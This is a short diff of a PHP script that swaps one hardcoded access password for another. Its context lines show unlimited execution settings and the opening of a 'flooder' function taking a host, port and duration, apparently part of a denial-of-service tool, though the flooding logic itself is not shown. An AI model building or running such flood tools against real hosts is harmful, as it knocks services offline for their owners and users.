@@ -7,7 +7,7 @@ set_time_limit(0);
 ignore_user_abort(TRUE);
 ini_set('max_execution_time', 0);
 
-$pass="qRedAction123";
+$pass="Dedsecrazz123";
 function flooder($type , $host , $port , $time){
 		$packets = 0;
         $timeserver = time();
